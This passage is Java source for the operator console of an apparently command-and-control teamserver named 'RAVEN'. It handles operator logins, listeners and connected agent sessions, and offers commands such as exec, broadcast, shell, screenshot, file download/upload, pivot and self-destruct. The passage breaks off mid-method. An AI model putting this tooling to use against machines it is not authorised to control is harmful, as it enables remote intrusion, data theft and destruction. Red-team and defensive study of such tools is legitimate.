package com.raven.interfaces.CLI;

import com.raven.core.command.CommandRegistry;
import com.raven.core.command.CommandRegistry.Category;
import com.raven.core.command.CommandRegistry.CommandDef;
import com.raven.core.command.ExportCommand;
import com.raven.core.database.TeamDatabase;
import com.raven.core.database.TeamDatabase.OperatorRole;
import com.raven.core.output.EventLog;
import com.raven.core.output.Logger;
import com.raven.core.output.PromptManager;
import com.raven.core.server.ListenerMode;
import com.raven.core.server.RavenServer;
import com.raven.core.session.Session;
import com.raven.interfaces.banner.CLIBanner;
import com.raven.utils.AnsiColor;
import com.raven.utils.ServerConfig;
import com.raven.utils.SystemHelper;
import com.raven.utils.TerminalHelper;
import java.io.BufferedReader;
import java.io.Console;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.time.Duration;
import java.time.Instant;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public final class CLI {

    private static final String PROMPT_TOP = AnsiColor.Red + "┌──{" + AnsiColor.White + "RAVEN" + AnsiColor.Red + "}" + AnsiColor.Reset;
    private static final String PROMPT_BOTTOM = AnsiColor.Red + "└─" + AnsiColor.White + ">>" + AnsiColor.Reset + " ";

    private final ServerConfig Config;
    private final TeamDatabase Db;
    private final EventLog Log;
    private final ExportCommand Export;

    private RavenServer Server;
    private Instant ServerStartTime;
    private boolean IsTeamMode;
    private ListenerMode ActiveMode = ListenerMode.MULTI;

    private String OperatorName;
    private OperatorRole OperatorRole;
    private volatile boolean Running = true;

    private static volatile RavenServer SharedServer;
    private static volatile Instant SharedServerStart;
    private static final Object ServerLock = new Object();

    public CLI(ServerConfig Config) {
        this.Config = Config;
        this.Db = TeamDatabase.Connect(Config);
        this.Log = new EventLog(Config.GetMaxLogEntries());
        this.Export = new ExportCommand(Db, Log);
        PromptManager.SetPrompt(PROMPT_BOTTOM);
    }

    public void Run(String Host, int Port, ListenerMode Mode) {
        this.ActiveMode = Mode;
        this.IsTeamMode = false;
        this.OperatorName = Config.GetAdminUsername();
        this.OperatorRole = OperatorRole.SUPER;
        if (!StartListener(Host, Port, Mode)) return;
        RunLoop();
    }

    public void RunTeamServer(String Host, int Port, ListenerMode Mode) {
        this.ActiveMode = Mode;
        this.IsTeamMode = true;
        BufferedReader Reader = new BufferedReader(new InputStreamReader(System.in));
        if (!Login(Reader)) return;
        if (!StartListener(Host, Port, Mode)) return;
        RunLoop();
    }

    private boolean Login(BufferedReader Reader) {
        System.out.println(TerminalHelper.Box("TEAMSERVER LOGIN"));
        System.out.println();
        Logger.Custom("  %sDefault: admin / admin (change after first login)%s%n%n", AnsiColor.White, AnsiColor.Reset);
        for (int Try = 1; Try <= 3; Try++) {
            try {
                Logger.Custom("  %sUsername:%s ", AnsiColor.Red, AnsiColor.Reset);
                System.out.flush();
                String User = Reader.readLine();
                if (User == null) return false;
                User = User.trim();
                Logger.Custom("  %sPassword:%s ", AnsiColor.Red, AnsiColor.Reset);
                System.out.flush();
                String Pass;
                Console C = System.console();
                if (C != null) {
                    char[] Chars = C.readPassword();
                    Pass = Chars != null ? new String(Chars) : "";
                } else {
                    Pass = Reader.readLine();
                }
                if (Pass == null) return false;
                if (!Db.ValidateOperator(User, TeamDatabase.HashPassword(Pass))) {
                    Logger.Custom("  %sInvalid credentials — attempt %d/3%s%n%n", AnsiColor.Red, Try, AnsiColor.Reset);
                    continue;
                }
                OperatorName = User;
                OperatorRole = Db.GetOperatorRole(User);
                Db.UpdateLastSeen(User);
                Logger.Info("Operator login: " + User + " [" + OperatorRole + "]");
                Logger.Custom("  %n%sWelcome, %s [%s]%s%n", AnsiColor.Green, User, OperatorRole, AnsiColor.Reset);
                Logger.Custom("  %sPermissions:%s %s%n%n", AnsiColor.Red, AnsiColor.White, OperatorRole.PermissionString());
                return true;
            } catch (IOException Ex) {
                return false;
            }
        }
        Logger.Error("authentication failed");
        return false;
    }

    private boolean StartListener(String Host, int Port, ListenerMode Mode) {
        if (IsTeamMode) {
            synchronized (ServerLock) {
                if (SharedServer != null && SharedServer.IsRunning()) {
                    Server = SharedServer;
                    ServerStartTime = SharedServerStart;
                    Logger.Info("Operator " + OperatorName + " joined existing listener on " + Host + ":" + Port);
                    return true;
                }
                RavenServer S = new RavenServer(Host, Port, Mode, Config);
                S.AddEventListener(this::HandleEvent);
                if (!S.StartServer()[0]) {
                    if (IsPortBound(Host, Port)) {
                        Logger.Info(OperatorName + " attached to listener on " + Host + ":" + Port + " (cross-process)");
                        ServerStartTime = Instant.now();
                        return true;
                    }
                    Logger.Error("failed to start listener");
                    return false;
                }
                SharedServer = S;
                SharedServerStart = Instant.now();
                Server = SharedServer;
                ServerStartTime = SharedServerStart;
                Thread T = new Thread(SharedServer::AcceptConnections, "AcceptConnections");
                T.setDaemon(true);
                T.start();
                return true;
            }
        }
        Server = new RavenServer(Host, Port, Mode, Config);
        Server.AddEventListener(this::HandleEvent);
        if (!Server.StartServer()[0]) {
            Logger.Error("failed to start listener");
            return false;
        }
        ServerStartTime = Instant.now();
        Thread T = new Thread(Server::AcceptConnections, "AcceptConnections");
        T.setDaemon(true);
        T.start();
        return true;
    }

    private void HandleEvent(com.raven.core.event.EventManager.EventType Type, Map<String, Object> Data) {
        switch (Type) {
            case ServerStarted -> AddLog(" server listening on " + Data.get("Host") + ":" + Data.get("Port"), true);
            case AgentConnected -> AddLog("[" + Data.get("AgentName") + "] session-" + Data.get("ID") + " key: " + Data.get("SessionKey") + " (" + Data.get("OS") + ")", true);
            case AgentDisconnected -> AddLog("session-" + Data.get("ID") + " disconnected: " + Data.get("Reason"), true);
            case AgentRemoved -> AddLog("session-" + Data.get("ID") + " removed", false);
            case Error -> AddLog("Error: " + Data.get("Message"), true);
        }
    }

    private void AddLog(String Msg, boolean Print) {
        Log.Add(Msg, Print);
    }

    private void RunLoop() {
        try {
            Thread.sleep(300);
        } catch (InterruptedException Ignored) {}
        BufferedReader Reader = new BufferedReader(new InputStreamReader(System.in));
        int LastCount = Log.Count();
        while (Running) {
            try {
                int Current = Log.Count();
                if (Current > LastCount) {
                    Logger.Info(Current - LastCount + " new event(s) - type 'logs' to view");
                    LastCount = Current;
                }
                System.out.println();
                System.out.println(PROMPT_TOP);
                System.out.print(PROMPT_BOTTOM);
                System.out.flush();
                PromptManager.MarkVisible(true);
                String Input = Reader.readLine();
                PromptManager.MarkVisible(false);
                if (Input == null || Input.isBlank()) continue;
                String[] Parts = Input.trim().split("\\s+", 3);
                String Cmd = Parts[0].toLowerCase();
                int Updated = Dispatch(Cmd, Parts);
                if (Updated < 0) break;
                if (Updated > 0) LastCount = Log.Count();
            } catch (IOException Ex) {
                break;
            }
        }
        Shutdown();
    }

    private int Dispatch(String Cmd, String[] P) {
        switch (Cmd) {
            case "exit", "quit" -> {
                Logger.Debug("shutting down");
                return -1;
            }
            case "help" -> ShowHelp();
            case "clear" -> {
                TerminalHelper.Clear();
                return 1;
            }
            case "status" -> {
                long Up = ServerStartTime != null ? Duration.between(ServerStartTime, Instant.now()).getSeconds() : 0;
                System.out.println(TerminalHelper.Box("SERVER STATUS"));
                System.out.println();
                if (Server != null && Server.IsRunning()) {
                    Logger.Custom("  %sStatus    %sONLINE%n", AnsiColor.Red, AnsiColor.Green);
                    Logger.Custom("  %sMode      %s%s%n", AnsiColor.Red, AnsiColor.White, ActiveMode.name());
                    Logger.Custom("  %sAddress   %s%s:%d%n", AnsiColor.Red, AnsiColor.White, Server.GetHost(), Server.GetPort());
                    Logger.Custom("  %sSessions  %s%d%n", AnsiColor.Red, AnsiColor.White, Server.GetSessions().Count());
                } else if (IsTeamMode && ServerStartTime != null) {
                    Logger.Custom("  %sStatus    %sONLINE (cross-process)%n", AnsiColor.Red, AnsiColor.Green);
                    Logger.Custom("  %sMode      %s%s%n", AnsiColor.Red, AnsiColor.White, ActiveMode.name());
                    Logger.Custom("  %sSessions  %s(cross-process)%n", AnsiColor.Red, AnsiColor.White);
                } else {
                    Logger.Custom("  %sStatus    %sOFFLINE%n", AnsiColor.Red, AnsiColor.Red);
                }
                Logger.Custom("  %sUptime    %s%s%n", AnsiColor.Red, AnsiColor.White, SystemHelper.FormatUptime(Up));
                Logger.Custom("  %sDatabase  %s%s (%s)%n", AnsiColor.Red, AnsiColor.White, Db.IsConnected() ? "connected" : "memory", Config.GetDatabaseType());
                if (IsTeamMode) Logger.Custom("  %sOperator  %s%s [%s]%n", AnsiColor.Red, AnsiColor.White, OperatorName, OperatorRole);
                System.out.println();
            }
            case "logs" -> {
                System.out.println(TerminalHelper.Box("RECENT LOGS"));
                System.out.println();
                List<String> Last = Log.GetLast(30);
                if (Last.isEmpty()) {
                    Logger.Info("  no logs");
                } else Last.forEach(E -> Logger.Custom("  %s%s%s%n", AnsiColor.White, E, AnsiColor.Reset));
                System.out.println();
                return 1;
            }
            case "sessions", "agents" -> ShowSessions();
            case "stats" -> ShowStats();
            case "tasks" -> ShowTasks();
            case "use" -> {
                if (P.length < 2) {
                    Logger.Info(Usage("use"));
                    break;
                }
                try {
                    Interactive(ParseInt(P[1]));
                    return 1;
                } catch (NumberFormatException Ex) {
                    Logger.Warn("invalid session ID");
                }
            }
            case "exec" -> {
                if (!CanExecute()) {
                    Logger.Warn("insufficient permissions");
                    break;
                }
                if (P.length < 3) {
                    Logger.Info(Usage("exec"));
                    break;
                }
                try {
                    Execute(ParseInt(P[1]), P[2]);
                } catch (NumberFormatException Ex) {
                    Logger.Warn("invalid session ID");
                }
            }
            case "broadcast" -> {
                if (!CanExecute()) {
                    Logger.Warn("insufficient permissions");
                    break;
                }
                if (P.length < 3) {
                    Logger.Info(Usage("broadcast"));
                    break;
                }
                String Target = P[1].toLowerCase();
                if (Target.equals("all")) {
                    BroadcastAll(P[2]);
                } else {
                    List<Integer> Ids = ParseIds(Target);
                    if (Ids.isEmpty()) Logger.Info("no valid session IDs");
                    else Broadcast(Ids, P[2]);
                }
            }
            case "kill" -> {
                if (P.length < 2) {
                    Logger.Info(Usage("kill"));
                    break;
                }
                try {
                    int Id = ParseInt(P[1]);
                    if (Server == null || !Server.IsRunning()) {
                        Logger.Warn("server not running");
                        break;
                    }
                    Server.RemoveSession(Id);
                    AddLog("[KILL] session-" + Id + " by " + OperatorName, true);
                } catch (NumberFormatException Ex) {
                    Logger.Warn("invalid session ID");
                }
            }
            case "sysinfo", "info" -> {
                if (P.length < 2) {
                    Logger.Info(Usage("sysinfo"));
                    break;
                }
                try {
                    ShowSessionInfo(ParseInt(P[1]));
                } catch (NumberFormatException Ex) {
                    Logger.Warn("invalid session ID");
                }
            }
            case "whoami" -> {
                if (P.length > 1) {
                    try {
                        Execute(ParseInt(P[1]), "whoami");
                    } catch (NumberFormatException Ex) {
                        Logger.Warn("invalid session ID");
                    }
                } else Logger.Info(Usage("whoami"));
            }
            case "screenshot" -> {
                if (P.length < 2) {
                    Logger.Info(Usage("screenshot"));
                    break;
                }
                try {
                    Execute(ParseInt(P[1]), "screenshot");
                } catch (NumberFormatException Ex) {
                    Logger.Warn("invalid session ID");
                }
            }
            case "download" -> {
                if (P.length < 3) {
                    Logger.Info(Usage("download"));
                    break;
                }
                try {
                    Execute(ParseInt(P[1]), "download " + P[2]);
                } catch (NumberFormatException Ex) {
                    Logger.Warn("invalid session ID");
                }
            }
            case "upload" -> {
                if (P.length < 3) {
                    Logger.Info(Usage("upload"));
                    break;
                }
                try {
                    String[] Up = P[2].split("\\s+", 2);
                    Execute(ParseInt(P[1]), "upload " + Up[0] + (Up.length > 1 ? " " + Up[1] : ""));
                } catch (NumberFormatException Ex) {
                    Logger.Warn("invalid session ID");
                }
            }
            case "sleep" -> {
                if (P.length < 3) {
                    Logger.Info(Usage("sleep"));
                    break;
                }
                try {
                    Execute(ParseInt(P[1]), "sleep " + P[2]);
                } catch (NumberFormatException Ex) {
                    Logger.Warn("invalid session ID");
                }
            }
            case "pivot" -> {
                if (P.length < 3) {
                    Logger.Info(Usage("pivot"));
                    break;
                }
                try {
                    Execute(ParseInt(P[1]), "pivot " + P[2]);
                } catch (NumberFormatException Ex) {
                    Logger.Warn("invalid session ID");
                }
            }
            case "ps" -> {
                if (P.length < 2) {
                    Logger.Info(Usage("ps"));
                    break;
                }
                try {
                    Execute(ParseInt(P[1]), "ps");
                } catch (NumberFormatException Ex) {
                    Logger.Warn("invalid session ID");
                }
            }
            case "pwd" -> {
                if (P.length < 2) {
                    Logger.Info(Usage("pwd"));
                    break;
                }
                try {
                    Execute(ParseInt(P[1]), "pwd");
                } catch (NumberFormatException Ex) {
                    Logger.Warn("invalid session ID");
                }
            }
            case "ls" -> {
                if (P.length < 2) {
                    Logger.Info(Usage("ls"));
                    break;
                }
                try {
                    Execute(ParseInt(P[1]), P.length > 2 ? "ls " + P[2] : "ls");
                } catch (NumberFormatException Ex) {
                    Logger.Warn("invalid session ID");
                }
            }
            case "cat" -> {
                if (P.length < 3) {
                    Logger.Info(Usage("cat"));
                    break;
                }
                try {
                    Execute(ParseInt(P[1]), "cat " + P[2]);
                } catch (NumberFormatException Ex) {
                    Logger.Warn("invalid session ID");
                }
            }
            case "rm" -> {
                if (P.length < 3) {
                    Logger.Info(Usage("rm"));
                    break;
                }
                try {
                    Execute(ParseInt(P[1]), "rm " + P[2]);
                } catch (NumberFormatException Ex) {
                    Logger.Warn("invalid session ID");
                }
            }
            case "mkdir" -> {
                if (P.length < 3) {
                    Logger.Info(Usage("mkdir"));
                    break;
                }
                try {
                    Execute(ParseInt(P[1]), "mkdir " + P[2]);
                } catch (NumberFormatException Ex) {
                    Logger.Warn("invalid session ID");
                }
            }
            case "env" -> {
                if (P.length < 2) {
                    Logger.Info(Usage("env"));
                    break;
                }
                try {
                    Execute(ParseInt(P[1]), "env");
                } catch (NumberFormatException Ex) {
                    Logger.Warn("invalid session ID");
                }
            }
            case "ifconfig", "ipconfig" -> {
                if (P.length < 2) {
                    Logger.Info(Usage("ifconfig"));
                    break;
                }
                try {
                    Execute(ParseInt(P[1]), "ifconfig");
                } catch (NumberFormatException Ex) {
                    Logger.Warn("invalid session ID");
                }
            }
            case "netstat" -> {
                if (P.length < 2) {
                    Logger.Info(Usage("netstat"));
                    break;
                }
                try {
                    Execute(ParseInt(P[1]), "netstat");
                } catch (NumberFormatException Ex) {
                    Logger.Warn("invalid session ID");
                }
            }
            case "shell" -> {
                if (P.length < 3) {
                    Logger.Info(Usage("shell"));
                    break;
                }
                try {
                    Execute(ParseInt(P[1]), "shell " + P[2]);
                } catch (NumberFormatException Ex) {
                    Logger.Warn("invalid session ID");
                }
            }
            case "history" -> {
                int Sid = P.length > 1 ? ParseIntSafe(P[1], 0) : 0;
                int Lim = P.length > 2 ? ParseIntSafe(P[2], 50) : 50;
                ShowCommandHistory(Sid, Lim);
            }
            case "note" -> {
                if (P.length < 3) {
                    Logger.Info(Usage("note"));
                    break;
                }
                try {
                    Db.SetAgentNote(ParseInt(P[1]), P[2]);
                    Logger.Success("Note saved for session-" + P[1]);
                } catch (NumberFormatException Ex) {
                    Logger.Warn("invalid session ID");
                }
            }
            case "getnote" -> {
                if (P.length < 2) {
                    Logger.Info(Usage("getnote"));
                    break;
                }
                try {
                    int Id = ParseInt(P[1]);
                    String Note = Db.GetAgentNote(Id);
                    Logger.Custom("  Note [%d]: %s%s%s%n", Id, AnsiColor.White, Note != null ? Note : "(none)", AnsiColor.Reset);
                } catch (NumberFormatException Ex) {
                    Logger.Warn("invalid session ID");
                }
            }
            case "listopt", "listoperators" -> ShowOperators();
            case "addopt", "addoperator" -> {
                if (!CanManage()) {
                    Logger.Warn("ADMIN/SUPER required");
                    break;
                }
                if (P.length < 3) {
                    Logger.Info(Usage("addopt"));
                    break;
                }
                String[] T = P[2].split("\\s+", 2);
                String Pass = T[0];
                String Role = T.length > 1 ? T[1] : "OPERATOR";
                if (Pass.length() < 8) {
                    Logger.Warn("password >= 8 chars required");
                    break;
                }
                OperatorRole R = OperatorRole.FromString(Role);
                if (R == OperatorRole.SUPER && !OperatorRole.IsSuperAdmin()) {
                    Logger.Warn("only SUPER can create SUPER");
                    break;
                }
                if (Db.CreateOperator(P[1], TeamDatabase.HashPassword(Pass), R)) Logger.Custom("  Operator created: %s [%s]%n", P[1], R);
                else Logger.Warn("username already exists");
            }
            case "delopt", "deleteoperator" -> {
                if (!CanManage()) {
                    Logger.Warn("ADMIN/SUPER required");
                    break;
                }
                if (P.length < 2) {
                    Logger.Info(Usage("delopt"));
                    break;
                }
                if (P[1].equalsIgnoreCase(Config.GetAdminUsername())) {
                    Logger.Warn("cannot delete admin");
                    break;
                }
                if (Db.DeleteOperator(P[1])) Logger.Custom("  Deleted: %s%n", P[1]);
                else Logger.Warn("operator not found");
            }
            case "kick", "kickopt" -> {
                if (OperatorRole == null || !OperatorRole.CanKickOperator()) {
                    Logger.Warn("SUPER role required");
                    break;
                }
                if (P.length < 2) {
                    Logger.Info(Usage("kick"));
                    break;
                }
                if (P[1].equalsIgnoreCase(Config.GetAdminUsername()) || P[1].equals(OperatorName)) {
                    Logger.Warn("cannot kick admin or yourself");
                    break;
                }
                if (Db.DeleteOperator(P[1])) Logger.Custom("  Kicked: %s%n", P[1]);
                else Logger.Warn("operator not found");
            }
            case "setrole", "changerole" -> {
                if (!CanManage()) {
                    Logger.Warn("ADMIN/SUPER required");
                    break;
                }
                if (P.length < 3) {
                    Logger.Info(Usage("setrole"));
                    break;
                }
                if (P[1].equalsIgnoreCase(Config.GetAdminUsername())) {
                    Logger.Warn("cannot change admin role");
                    break;
                }
                OperatorRole NewRole = OperatorRole.FromString(P[2]);
                if (Db.UpdateOperatorRole(P[1], NewRole)) Logger.Custom("  Role: %s > %s%n", P[1], NewRole);
                else Logger.Warn("operator not found");
            }
            case "passwd", "changepassword" -> {
                if (!CanManage()) {
                    Logger.Warn("ADMIN/SUPER required");
                    break;
                }
                if (P.length < 3) {
                    Logger.Info(Usage("passwd"));
                    break;
                }
                if (P[2].length() < 8) {
                    Logger.Warn("password >= 8 chars required");
                    break;
                }
                if (Db.UpdateOperatorPassword(P[1], TeamDatabase.HashPassword(P[2]))) Logger.Custom("  Password updated: %s%n", P[1]);
                else Logger.Warn("operator not found");
            }
            case "chat" -> ShowChat();
            case "chathistory", "chatlog" -> ShowChatHistory(50);
            case "ch" -> {
                if (!IsTeamMode) {
                    Logger.Warn("not in team mode");
                    break;
                }
                if (P.length < 3) {
                    Logger.Info(Usage("ch"));
                    break;
                }
                Db.SaveChatLog(OperatorName, P[1], P[2]);
                Logger.Custom("  %s→ %s:%s %s%n", AnsiColor.Green, P[1], AnsiColor.Reset, P[2]);
            }
            case "gc" -> {
                if (!IsTeamMode) {
                    Logger.Warn("not in team mode");
                    break;
                }
                if (P.length < 3) {
                    Logger.Info(Usage("gc"));
                    break;
                }
                String Target = P[1].toLowerCase();
                String Msg = P[2];
                if (Target.equals("all")) {
                    Db.SaveChatLog(OperatorName, "all", Msg);
                    Logger.Custom("  %s→ all:%s %s%n", AnsiColor.Green, AnsiColor.Reset, Msg);
                } else {
                    for (String Name : Target.split(",")) {
                        String N = Name.trim();
                        if (!N.isEmpty()) {
                            Db.SaveChatLog(OperatorName, N, Msg);
                        }
                    }
                    Logger.Custom("  %s→ %s:%s %s%n", AnsiColor.Green, Target, AnsiColor.Reset, Msg);
                }
            }
            case "export" -> {
                if (P.length < 3) {
                    Logger.Info(Usage("export"));
                    break;
                }
                Export.Run(P[1], P[2]);
            }
            case "sessions-history", "sesshistory" -> {
                int Lim = P.length > 1 ? ParseIntSafe(P[1], 50) : 50;
                List<Map<String, Object>> Sess = Db.GetSessionHistory(Lim);
                System.out.println(TerminalHelper.Box("SESSION HISTORY (last " + Lim + ")"));
                System.out.println();
                Sess.forEach(S -> Logger.Custom("  %s%s%s%n", AnsiColor.White, S, AnsiColor.Reset));
                System.out.println();
            }
            case "ping" -> {
                if (P.length < 2) {
                    Logger.Info(Usage("ping"));
                    break;
                }
                try {
                    Execute(ParseInt(P[1]), "ping");
                } catch (NumberFormatException Ex) {
                    Logger.Warn("invalid session ID");
                }
            }
            case "reconnect" -> {
                if (P.length < 2) {
                    Logger.Info(Usage("reconnect"));
                    break;
                }
                try {
                    Execute(ParseInt(P[1]), "reconnect");
                } catch (NumberFormatException Ex) {
                    Logger.Warn("invalid session ID");
                }
            }
            case "self-destruct", "selfdestruct" -> {
                if (!CanManage()) {
                    Logger.Warn("ADMIN/SUPER required");
                    break;
                }
                if (P.length < 2) {
                    Logger.Info(Usage("self-destruct"));
                    break;
                }
                try {
                    Execute(ParseInt(P[1]), "self-destruct");
                } catch (NumberFormatException Ex) {
                    Logger.Warn("invalid session ID");
                }
            }
            default -> {
                Logger.Error("unknown command: " + Cmd);
                Logger.Info("type 'help' for available commands");
            }
        }
        return 0;
    }

    private void ShowHelp() {
        System.out.println(TerminalHelper.Box("COMMAND REFERENCE"));
        System.out.println();
        CLIBanner.Print();
        if (IsTeamMode && OperatorName != null) {
            System.out.println();
            Logger.Custom("  %s[TEAMSERVER MODE]%s  Operator: %s%s%s  Role: %s%s%s%n", AnsiColor.Red, AnsiColor.Reset, AnsiColor.White, OperatorName, AnsiColor.Reset, AnsiColor.White, OperatorRole != null ? OperatorRole.name() : "?", AnsiColor.Reset);
            if (OperatorRole != null) Logger.Custom("  %sPermissions:%s %s%n", AnsiColor.Red, AnsiColor.White, OperatorRole.PermissionString());
        }
        System.out.println();
        for (Category Cat : Category.values()) {
            List<CommandDef> Cmds = CommandRegistry.ByCategory(Cat);
            if (Cmds.isEmpty()) continue;
            Logger.Custom("  %s%s%s%n", AnsiColor.Red, Cat.name(), AnsiColor.Reset);
            for (CommandDef Def : Cmds) {
                if (Def.RequireTeamMode() && !IsTeamMode) continue;
                Logger.Custom("    %s%-42s%s %s%n", AnsiColor.White, Def.Usage(), AnsiColor.Reset, Def.Description());
            }
            System.out.println();
        }
    }

    private void ShowSessions() {
        if (Server == null || !Server.IsRunning()) {
            Logger.Warn("server not running");
            return;
        }
        List<Session> All = Server.GetSessions().GetAll();
        System.out.println(TerminalHelper.Box("ACTIVE SESSIONS (" + All.size() + ")"));
        System.out.println();
        if (All.isEmpty()) {
            Logger.Info("  no active sessions");
            System.out.println();
            return;
        }
        Logger.Custom("  %s%-5s %-14s %-16s %-14s %-10s %-10s %s%s%n", AnsiColor.Red, "ID", "NAME", "IP", "TYPE", "OS", "USER", "KEY", AnsiColor.Reset);
        System.out.println(TerminalHelper.Divider());
        for (Session S : All) {
            Logger.Custom("  %s#%-4d %-14s %-16s %-14s %-10s %-10s %s%s%n", AnsiColor.White, S.GetId(), TerminalHelper.Truncate(S.GetAgentName(), 14), TerminalHelper.Truncate(S.GetAgentIp(), 16), S.GetSessionType().name(), TerminalHelper.Truncate(S.GetOs(), 10), TerminalHelper.Truncate(S.GetUser(), 10), S.GetSessionKey(), AnsiColor.Reset);
        }
        System.out.println();
    }

    private void ShowStats() {
        if (Server == null || !Server.IsRunning()) {
            Logger.Warn("server not running");
            return;
        }
        int Count = Server.GetSessions().Count();
        System.out.println(TerminalHelper.Box("SESSION STATS"));
        System.out.println();
        Logger.Custom("  %sTotal Active%s  %d%n", AnsiColor.Red, AnsiColor.White, Count);
        System.out.println();
    }

    private void ShowTasks() {
        System.out.println(TerminalHelper.Box("TASK QUEUE"));
        System.out.println();
        Logger.Info("  (task queue display not implemented — extend here)");
        System.out.println();
    }

    private void ShowSessionInfo(int Id) {
        if (Server == null || !Server.IsRunning()) {
            Logger.Warn("server not running");
            return;
        }
        Session S = Server.GetSessions().Get(Id).orElse(null);
        if (S == null) {
            Logger.Warn("session not found: " + Id);
            return;
        }
        System.out.println(TerminalHelper.Box("SESSION INFO — #" + Id));
        System.out.println();
        Logger.Custom("  %sID          %s%d%n", AnsiColor.Red, AnsiColor.White, S.GetId());
        Logger.Custom("  %sName        %s%s%n", AnsiColor.Red, AnsiColor.White, S.GetAgentName());
        Logger.Custom("  %sHostname    %s%s%n", AnsiColor.Red, AnsiColor.White, S.GetHostname());
        Logger.Custom("  %sOS          %s%s%n", AnsiColor.Red, AnsiColor.White, S.GetOs());
        Logger.Custom("  %sUser        %s%s%n", AnsiColor.Red, AnsiColor.White, S.GetUser());
        Logger.Custom("  %sArch        %s%s%n", AnsiColor.Red, AnsiColor.White, S.GetArch());
        Logger.Custom("  %sIP          %s%s%n", AnsiColor.Red, AnsiColor.White, S.GetAgentIp());
        Logger.Custom("  %sType        %s%s%n", AnsiColor.Red, AnsiColor.White, S.GetSessionType().name());
        Logger.Custom("  %sEncrypted   %s%b%n", AnsiColor.Red, AnsiColor.White, S.IsEncrypted());
        Logger.Custom("  %smTLS        %s%b%n", AnsiColor.Red, AnsiColor.White, S.IsMtlsEnabled());
        Logger.Custom("  %sJoined      %s%s%n", AnsiColor.Red, AnsiColor.White, S.GetJoinedAt());
        Logger.Custom("  %sNote        %s%s%n", AnsiColor.Red, AnsiColor.White, Db.GetAgentNote(Id));
        System.out.println();
    }

    private void Interactive(int Id) {
        if (Server == null || !Server.IsRunning()) {
            Logger.Warn("server not running");
            return;
        }
        Session S = Server.GetSessions().Get(Id).orElse(null);
        if (S == null) {
            Logger.Warn("session not found: " + Id);
            return;
        }
        BufferedReader Reader = new BufferedReader(new InputStreamReader(System.in));
        Logger.Custom("  %sInteractive shell — session-%d  (type 'back' to return)%s%n%n", AnsiColor.Green, Id, AnsiColor.Reset);
        while (true) {
            System.out.print(AnsiColor.Red + "[session-" + Id + "] " + AnsiColor.White + ">> " + AnsiColor.Reset);
            System.out.flush();
            try {
                String Input = Reader.readLine();
                if (Input == null || Input.equalsIgnoreCase("back") || Input.equalsIgnoreCase("exit")) break;
                if (Input.isBlank()) continue;
                Execute(Id, Input);
            } catch (IOException Ex) {
                break;
            }
        }
        Logger.Custom("  %sReturned to main shell%s%n%n", AnsiColor.White, AnsiColor.Reset);
    }

    private void Execute(int Id, String Cmd) {
        if (Server == null || !Server.IsRunning()) {
            Logger.Warn("server not running");
            return;
        }
        AddLog("[>] [" + OperatorName + "] session-" + Id + " » " + Cmd, false);
        String[] R = Server.ExecuteCommand(Id, Cmd);
        boolean Ok = Boolean.parseBoolean(R[0]);
        Db.SaveCommandLog(Id, OperatorName, Cmd, R[1], Ok);
        if (Ok) System.out.println(TerminalHelper.OutputBox(R[1]));
        else Logger.Error(R[1]);
        System.out.println();
    }

    private void Broadcast(List<Integer> Ids, String Cmd) {
        if (Server == null || !Server.IsRunning()) {
            Logger.Warn("server not running");
            return;
        }
        AddLog("[BROADCAST] [" + OperatorName + "] > " + Ids.size() + " agents » " + Cmd, true);
        Map<Integer, String[]> Results = Server.BroadcastCommand(Ids, Cmd);
        Results.forEach((Id, R) -> {
            boolean Ok = Boolean.parseBoolean(R[0]);
            Db.SaveCommandLog(Id, OperatorName, Cmd, R[1], Ok);
            Logger.Custom("  %s[session-%d]%s %s%n", Ok ? AnsiColor.Green : AnsiColor.Red, Id, AnsiColor.Reset, R[1]);
        });
    }

    private void BroadcastAll(String Cmd) {
        if (Server == null || !Server.IsRunning()) {
            Logger.Warn("server not running");
            return;
        }
        AddLog("[BROADCAST-ALL] [" + OperatorName + "] > " + Server.GetSessions().Count() + " agents » " + Cmd, true);
        Map<Integer, String[]> Results = Server.BroadcastAll(Cmd);
        Results.forEach((Id, R) -> {
            boolean Ok = Boolean.parseBoolean(R[0]);
            Db.SaveCommandLog(Id, OperatorName, Cmd, R[1], Ok);
            Logger.Custom("  %s[session-%d]%s %s%n", Ok ? AnsiColor.Green : AnsiColor.Red, Id, AnsiColor.Reset, R[1]);
        });
    }

    private void ShowCommandHistory(int AgentId, int Limit) {
        List<Map<String, Object>> Hist = Db.GetCommandHistory(AgentId, Limit);
        System.out.println(TerminalHelper.Box("COMMAND HISTORY (last " + Limit + (AgentId > 0 ? " — session-" + AgentId : "") + ")"));
        System.out.println();
        if (Hist.isEmpty()) {
            Logger.Info("  no history");
            System.out.println();
            return;
        }
        Logger.Custom("  %s%-5s %-12s %-10s %-36s %s%s%n", AnsiColor.Red, "SID", "OPERATOR", "STATUS", "COMMAND", "TIMESTAMP", AnsiColor.Reset);
        System.out.println(TerminalHelper.Divider());
        for (Map<String, Object> H : Hist) {
            boolean Ok = Boolean.parseBoolean(H.getOrDefault("Success", "false").toString());
            String Cmd = TerminalHelper.Truncate(H.getOrDefault("Command", "").toString(), 36);
            Logger.Custom("  %s%-5s %-12s %s%-10s%s %-36s %s%s%n", AnsiColor.White, H.getOrDefault("AgentId", "?"), TerminalHelper.Truncate(H.getOrDefault("Operator", "?").toString(), 12), Ok ? AnsiColor.Green : AnsiColor.Red, Ok ? "✔ ok" : "✘ fail", AnsiColor.White, Cmd, H.getOrDefault("Timestamp", ""), AnsiColor.Reset);
        }
        System.out.println();
    }

    private void ShowOperators() {
        List<Map<String, Object>> Ops = Db.GetOperators();
        System.out.println(TerminalHelper.Box("OPERATORS (" + Ops.size() + ")"));
        System.out.println();
        Logger.Custom("  %s%-18s %-14s %-30s %-20s%s%n", AnsiColor.Green, "USERNAME", "ROLE", "PERMISSIONS", "LAST SEEN", AnsiColor.Reset);
        System.out.println(TerminalHelper.Divider());
        for (Map<String, Object> Op : Ops) {
            OperatorRole R = OperatorRole.FromString(Op.get("Role").toString());
            boolean Me = Op.get("Username").toString().equals(OperatorName);
            String Tag = Me ? AnsiColor.Green + " ◀ YOU" + AnsiColor.White : "";
            Logger.Custom("  %s%-18s %-14s %-30s %-20s%s%s%n", AnsiColor.White, Op.get("Username"), R.name(), R.PermissionString(), Op.getOrDefault("LastSeen", "Never"), Tag, AnsiColor.Reset);
        }
        System.out.println();
        Logger.Custom("  %sRole Reference:%s%n", AnsiColor.Red, AnsiColor.Reset);
